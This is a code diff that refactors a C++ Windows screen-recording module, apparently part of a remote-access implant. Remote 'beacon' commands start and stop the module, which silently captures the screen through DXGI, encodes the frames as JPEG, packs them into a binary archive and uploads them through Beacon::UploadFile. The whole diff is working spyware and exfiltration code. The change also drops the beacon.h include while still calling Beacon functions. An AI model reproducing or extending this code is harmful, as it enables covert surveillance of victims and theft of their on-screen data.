@@ -1,9 +1,10 @@
 #include "screen_recorder.h"
 #include "../config.h"
-#include "../utils.h"
-#include "../beacon.h"
+#include "../dxgi_capture.h"
 #include <windows.h>
 #include <gdiplus.h>
+#include <cstdlib>
+#include <vector>
 #pragma comment(lib, "gdiplus.lib")
 
 namespace ScreenRecorder {
@@ -12,131 +13,131 @@ namespace ScreenRecorder {
     int durationSec = 60;
     int fps = 10;
     int quality = 80;
-    std::string currentFile;
-    
     ULONG_PTR gdiToken = 0;
-    
-    struct JpegEncoderParams {
-        ULONG quality;
-        EncoderParameters params;
-    };
-    
-    std::vector<BYTE> CaptureScreenToJpeg(int quality) {
-        HDC hScreen = GetDC(NULL);
-        int width = GetSystemMetrics(SM_CXSCREEN);
-        int height = GetSystemMetrics(SM_CYSCREEN);
-        
-        HDC hDC = CreateCompatibleDC(hScreen);
-        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
-        SelectObject(hDC, hBitmap);
-        BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
-        
-        // Convert to JPEG using GDI+
-        Gdiplus::Bitmap bitmap(hBitmap, NULL);
-        
+
+    static int GetJpegEncoderClsid(CLSID* clsid) {
+        UINT num = 0, size = 0;
+        Gdiplus::GetImageEncodersSize(&num, &size);
+        if (size == 0) return -1;
+        auto codecs = (Gdiplus::ImageCodecInfo*)malloc(size);
+        Gdiplus::GetImageEncoders(num, size, codecs);
+        for (UINT i = 0; i < num; i++) {
+            if (wcscmp(codecs[i].MimeType, L"image/jpeg") == 0) {
+                *clsid = codecs[i].Clsid;
+                free(codecs);
+                return 0;
+            }
+        }
+        free(codecs);
+        return -1;
+    }
+
+    static std::vector<BYTE> BgraToJpeg(const BYTE* bgra, int w, int h, int q) {
+        Gdiplus::Bitmap bmp(w, h, w * 4, PixelFormat32bppRGB, (BYTE*)bgra);
         CLSID clsid;
-        Gdiplus::GetEncoderClsid(L"image/jpeg", &clsid);
-        
-        Gdiplus::EncoderParameters encoderParams;
-        encoderParams.Count = 1;
-        encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
-        encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
-        encoderParams.Parameter[0].NumberOfValues = 1;
-        ULONG q = quality;
-        encoderParams.Parameter[0].Value = &q;
-        
-        IStream* stream = NULL;
-        CreateStreamOnHGlobal(NULL, TRUE, &stream);
-        bitmap.Save(stream, &clsid, &encoderParams);
-        
-        // Read stream to vector
+        GetJpegEncoderClsid(&clsid);
+        Gdiplus::EncoderParameters params;
+        params.Count = 1;
+        params.Parameter[0].Guid = Gdiplus::EncoderQuality;
+        params.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
+        params.Parameter[0].NumberOfValues = 1;
+        ULONG ql = q;
+        params.Parameter[0].Value = &ql;
+
+        IStream* stream = nullptr;
+        CreateStreamOnHGlobal(nullptr, TRUE, &stream);
+        bmp.Save(stream, &clsid, &params);
+
         STATSTG stat;
         stream->Stat(&stat, STATFLAG_NONAME);
-        LARGE_INTEGER pos = {0};
-        stream->Seek(pos, STREAM_SEEK_SET, NULL);
-        
+        LARGE_INTEGER zero = {};
+        stream->Seek(zero, STREAM_SEEK_SET, nullptr);
+
         std::vector<BYTE> data(stat.cbSize.LowPart);
         ULONG read = 0;
-        stream->Read(data.data(), stat.cbSize.LowPart, &read);
+        stream->Read(data.data(), (ULONG)data.size(), &read);
         stream->Release();
-        
-        DeleteObject(hBitmap);
-        DeleteDC(hDC);
-        ReleaseDC(NULL, hScreen);
-        
         return data;
     }
-    
+
     DWORD WINAPI RecordThread(LPVOID param) {
-        CreateDirectoryA(SCREEN_CACHE_PATH, NULL);
-        
-        std::string timestamp = std::to_string(time(0));
-        currentFile = std::string(SCREEN_CACHE_PATH) + "\\rec_" + timestamp;
-        
-        int frames = durationSec * fps;
+        DXGICapture capture;
+        if (!capture.Init()) {
+            recording = false;
+            return 1;
+        }
+
+        if (!gdiToken) {
+            Gdiplus::GdiplusStartupInput input;
+            Gdiplus::GdiplusStartup(&gdiToken, &input, nullptr);
+        }
+
+        int totalFrames = durationSec * fps;
         int intervalMs = 1000 / fps;
-        
-        for (int i = 0; i < frames && recording; i++) {
-            auto jpeg = CaptureScreenToJpeg(quality);
-            std::string frameFile = currentFile + "_" + std::to_string(i) + ".jpg";
-            Utils::WriteFileBinary(frameFile, jpeg);
+
+        std::vector<std::vector<BYTE>> frames;
+        frames.reserve(totalFrames);
+
+        for (int i = 0; i < totalFrames && recording; i++) {
+            std::vector<BYTE> bgra;
+            int w = 0, h = 0;
+            if (capture.CaptureFrame(bgra, w, h)) {
+                auto jpeg = BgraToJpeg(bgra.data(), w, h, quality);
+                if (!jpeg.empty()) {
+                    frames.push_back(std::move(jpeg));
+                }
+            }
             Sleep(intervalMs);
         }
-        
-        // Package frames into a simple format (or upload individually)
-        // For now, upload all frames as a zip-like sequence
+
+        capture.Release();
+
+        // Pack: [4-byte count] [4-byte size] [data] ...
         std::vector<BYTE> archive;
-        for (int i = 0; i < frames; i++) {
-            std::string frameFile = currentFile + "_" + std::to_string(i) + ".jpg";
-            auto data = Utils::ReadFileBinary(frameFile);
-            if (data.empty()) break;
-            
-            // Simple header: 4 bytes size + data
-            DWORD size = (DWORD)data.size();
-            archive.insert(archive.end(), (BYTE*)&size, (BYTE*)&size + sizeof(size));
-            archive.insert(archive.end(), data.begin(), data.end());
-            
-            DeleteFileA(frameFile.c_str());
+        DWORD count = (DWORD)frames.size();
+        archive.insert(archive.end(), (BYTE*)&count, (BYTE*)&count + 4);
+        for (auto& frame : frames) {
+            DWORD sz = (DWORD)frame.size();
+            archive.insert(archive.end(), (BYTE*)&sz, (BYTE*)&sz + 4);
+            archive.insert(archive.end(), frame.begin(), frame.end());
         }
-        
+
         if (!archive.empty()) {
             Beacon::UploadFile("screen_rec", "screen_rec.bin", archive);
         }
-        
+
         recording = false;
         return 0;
     }
-    
+
     void Start(const std::string& params) {
         if (recording) return;
-        
-        // Parse params (simplified)
         durationSec = 60;
         fps = SCREEN_FPS;
         quality = SCREEN_QUALITY;
-        
+
         if (!gdiToken) {
             Gdiplus::GdiplusStartupInput input;
-            Gdiplus::GdiplusStartup(&gdiToken, &input, NULL);
+            Gdiplus::GdiplusStartup(&gdiToken, &input, nullptr);
         }
-        
+
         recording = true;
-        hThread = CreateThread(NULL, 0, RecordThread, NULL, 0, NULL);
+        hThread = CreateThread(nullptr, 0, RecordThread, nullptr, 0, nullptr);
     }
-    
+
     void Stop() {
         recording = false;
         if (hThread) {
             WaitForSingleObject(hThread, 5000);
             CloseHandle(hThread);
-            hThread = NULL;
+            hThread = nullptr;
         }
     }
-    
+
     void OnCommand(const Beacon::Command& cmd) {
         if (cmd.type == "screen_rec_start") Start(cmd.params);
         else if (cmd.type == "screen_rec_stop") Stop();
     }
-    
+
     bool IsRecording() { return recording; }
 }
